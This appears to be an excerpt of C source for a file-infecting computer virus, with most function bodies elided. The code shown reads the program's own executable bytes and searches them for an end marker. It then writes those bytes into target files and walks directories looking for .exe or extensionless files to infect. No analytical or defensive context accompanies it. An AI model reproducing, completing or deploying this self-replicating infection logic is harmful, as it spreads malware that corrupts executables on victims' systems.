...
int64_t getOwnBytes(char **bytes, const char *arg0)
{
	...
	if (strcmp(getFileExtension(arg0), "exe\0")
	    && strcmp(getFileExtension(arg0), "com\0")) {
		execname =
		    (char *) malloc(sizeof(char) * (strlen(arg0) + 4));
	...
	*bytes = (char *) malloc(sizeof(char) * size);
	...
	//Check for marker
	bool c;
	for (int64_t i = 0; i < size - (int64_t) strlen(END_MARKER); i++) {
...
bool infectTarget(const char *target, const char *malbytes,
		  const int64_t malsize)
{
	...
	if (fwrite(malbytes, 1, malsize, tarfile) !=
	    (unsigned long) malsize) {
...
bool infectDirectory(const char *path, const char *arg0)
{
	...
	for (unsigned int i = 0; strcmp(ls[i], "\0"); i++) {
		...
		if (!strcmp(getFileExtension(ls[i]), "\0")
		    || !strcmp(getFileExtension(ls[i]), "exe\0")) {
